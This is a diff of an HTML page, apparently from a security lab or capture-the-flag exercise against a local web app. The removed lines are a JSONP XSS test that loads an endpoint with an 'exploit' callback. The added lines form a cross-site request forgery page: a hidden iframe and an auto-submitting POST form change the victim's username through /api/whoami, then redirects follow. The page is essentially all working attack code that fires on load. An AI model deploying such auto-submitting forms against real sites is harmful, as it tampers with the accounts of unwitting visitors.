@@ -1,22 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JSONP Test</title>
+  <title>Redirect</title>
 </head>
 <body>
-    <h1>JSONP XSS Test</h1>
-    <div id="result">Waiting for data...</div>
-
-    <script>
-    const userConfirmed = confirm("Хотите перейти на http://localhost:8000/#/Sheets?");
-    if (userConfirmed) {
-      document.body.innerHTML = "<p>Переход отменен</p>";
-    } else {
-      window.location.href = "http://localhost:8000/#/Sheets";
-    }
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame">
+    <input type="hidden" name="new_username" value="wildspruce">
+  </form>
+  
+  <script>
+      setTimeout(() => {
+      window.location.href = "http://localhost:8000/#/sheets";
+    }, 1000);
+      
+    document.getElementById('postForm').submit();
+    
+    // Переход на #/settings через 1 секунду
+    setTimeout(() => {
+      window.location.href = "http://localhost:8000/#/settings";
+    }, 2000);
   </script>
-
-    <!-- Загружаем JSONP endpoint с нашим callback -->
-    <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
 </body>
 </html>
